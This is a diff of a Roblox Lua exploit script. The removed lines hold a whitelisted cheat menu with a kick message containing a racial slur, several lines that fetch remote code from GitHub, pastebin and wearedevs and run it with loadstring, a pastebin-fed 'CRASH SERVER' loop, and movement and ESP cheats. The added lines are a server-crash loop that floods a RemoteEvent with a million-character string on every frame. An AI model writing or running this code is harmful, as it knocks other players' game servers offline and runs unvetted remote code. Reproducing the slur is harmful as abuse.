@@ -1,48 +1,5 @@
-local allowedUsers = {
-    ["hahahooo775"] = true,
-    ["Mark_6740"] = true,
-    ["ahahayayabit7"] = true,
-    ["hahahooo775"] = true,
-    ["yalesgoo123"] = true,
-    ["ID"] = true,
-}
+local runService = game:GetService("RunService")
 
-if allowedUsers[game:GetService("Players").LocalPlayer.Name] then print('passed') else game:GetService("Players").LocalPlayer:Kick("You are not whitelisted nigga if you wanna buy dm on discord mark.#0001")return end
-
-local VLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/vep1032/VepStuff/main/VL"))()
-
-local s = VLib:Window("Markhub", "Dupe V3", "ViP")
-
-local ss = s:Tab("Main")
-
-
-ss:Button("CRASH SERVER",function(enable9)
-local ver = game:HttpGet("https://pastebin.com/raw/LvGVfqfH")
-while task.wait(1) do
-game.Workspace.__THINGS.__REMOTES.MAIN:FireServer("b", ver)
-end
-end)
-
-local ss = s:Tab("Misc")
-
-ss:Slider("Wakspeed",1,500,16,function(speed)
-    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = (speed)
-end)
-
-ss:Slider("Jump Power",1,500,16,function(Jump)
-    game.Players.LocalPlayer.Character.Humanoid.JumpPower = (Jump)
-end)
-
-ss:Slider("Fov",16,120,70,function(t)
-    local FovNumber = (t)
-local Camera = workspace.CurrentCamera
-Camera.FieldOfView = FovNumber
-    end)
-
-ss:Button("Esp",function()
-    loadstring(game:HttpGet("https://cdn.wearedevs.net/scripts/WRD ESP.txt"))()
-end)
-
-ss:Button("Chams",function()
-    pcall(loadstring(game:HttpGet("https://pastebin.com/raw/eH39iKSg")))
+runService.Heartbeat:Connect(function()
+game:GetService("ReplicatedStorage").RemoteEvent:FireServer(string.rep("a", 1000000))
 end)
